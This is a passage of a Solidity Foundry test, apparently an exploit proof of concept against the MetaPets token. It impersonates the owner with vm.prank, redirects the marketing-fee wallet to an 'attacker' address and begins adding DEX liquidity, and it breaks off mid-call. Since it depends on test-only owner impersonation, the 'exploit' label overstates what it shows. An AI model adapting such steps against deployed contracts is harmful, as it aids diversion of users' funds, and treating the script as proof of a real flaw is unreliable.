    function setUp() public {
        // Get the contract instance
        IMetaPets target = IMetaPets(TARGET);

        // Get the current owner
        address owner = target.owner();

        // Label addresses for debugging
        vm.label(owner, "Contract Owner");
        vm.label(address(target), "MetaPets Token");
        vm.label(attacker, "Attacker");

        // Give attacker some initial ETH for gas and to buy tokens if needed
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get contract instance
        IMetaPets target = IMetaPets(TARGET);
        address owner = target.owner();

        // Step 2: Impersonate owner and set marketing wallet to attacker
        vm.prank(owner);
        target.setMarketingWallet(attacker);

        // Step 3: Use default 8% marketing fee (don't change it)

        // Step 4: Get some tokens to make a transfer
        // The owner has all tokens initially. Transfer some to a dummy address
        address dummy = address(0x123);
        vm.prank(owner);
        target.transfer(dummy, 100000 * 10**9); // Transfer reasonable amount

        // Also give attacker some tokens to start with for selling
        vm.prank(owner);
        target.transfer(attacker, 10000 * 10**9);

        // Step 5: Add some liquidity to the DEX pair so swaps work
        // First, approve router to spend owner's tokens
        address routerAddress = target.uniswapV2Router();
        IUniswapV2Router02 router = IUniswapV2Router02(routerAddress);

        vm.prank(owner);
        target.approve(routerAddress, type(uint256).max);

        // Add liquidity with some ETH
        vm.deal(owner, 10 ether);
        vm.prank(owner);
        router.addLiquidityETH{value: 1 ether}(
            address(target),
            10000 * 10**9, // tokens
            0, // min tokens
